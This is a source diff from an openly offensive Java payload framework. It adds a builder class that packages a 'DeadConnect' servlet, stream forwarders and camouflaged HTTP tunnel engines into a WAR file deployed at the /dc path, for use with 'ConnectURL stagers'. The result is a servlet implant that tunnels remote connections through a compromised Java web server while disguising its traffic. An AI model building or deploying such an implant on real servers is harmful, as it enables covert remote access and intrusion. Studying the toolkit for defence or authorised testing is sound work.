@@ -1,5 +1,5 @@
 /*
- * Java Payloads.
+ * J2EE Payloads.
  * 
  * Copyright (c) 2012 Michael 'mihi' Schierl
  * All rights reserved.
@@ -32,29 +32,46 @@
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-package javapayload.crypter;
+package j2eepayload.builder;
 
-import java.io.PrintStream;
+import j2eepayload.servlet.DeadConnectServlet;
+import javapayload.builder.Builder;
 
-import javapayload.Module;
-import javapayload.Parameter;
+public class DeadConnectWarBuilder extends Builder {
 
-public abstract class Crypter extends Module {
-
-	public Crypter(String summary, String description) {
-		super(null, Crypter.class, summary, description);
+	public DeadConnectWarBuilder() {
+		super("Build a WAR file that contains a DeadConnect servlet.",
+				"DeadConnect servlets are used with ConnectURL stagers.");
 	}
 
-	public final Parameter[] getParameters() {
-		throw new UnsupportedOperationException("Parameters not available for crypters");
-	}
-	
-	public String getNameAndParameters() {
-		return getName();
-	}
-	
-	public void printParameterDescription(PrintStream out) {
+	public String getParameterSyntax() {
+		return "[--strip] <filename>.war";
 	}
 
-	public abstract byte[] crypt(String className, byte[] innerClassBytes) throws Exception;
+	public void build(String[] args) throws Exception {
+		boolean stripDebugInfo = (args[0].equals("--strip"));
+		String warName = stripDebugInfo ? args[1] : args[0];
+		Class[] classes = new Class[] {
+				j2eepayload.servlet.DeadConnectServlet.class,
+				javapayload.stage.StreamForwarder.class,
+				jtcpfwd.util.http.PollingHandlerFactory.class,
+				jtcpfwd.util.PollingHandler.class,
+				jtcpfwd.util.PollingHandler.OutputStreamHandler.class,
+				jtcpfwd.util.http.HTTPTunnelEngine.class,
+				jtcpfwd.util.http.StreamingHTTPTunnelEngine.class,
+				jtcpfwd.util.http.CamouflageHTTPTunnelEngine.class,
+
+				// classes to be pushed to clients
+				jtcpfwd.util.http.HTTPTunnelClient.class,
+				jtcpfwd.util.http.HTTPTunnelClient.HTTPSender.class,
+				jtcpfwd.util.http.HTTPTunnelClient.HTTPReceiver.class,
+				jtcpfwd.util.http.HTTPTunnelClient.CamouflageHandler.class,
+				j2eepayload.servlet.DeadConnectClientHelper.class,
+		};
+		String webXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" +
+				"<web-app>\r\n" +
+				WarBuilder.getServletEntry("DeadConnectServlet", DeadConnectServlet.class, "/dc", null) +
+				"</web-app>";
+		WarBuilder.buildWar(warName, classes, stripDebugInfo, webXml);
+	}
 }
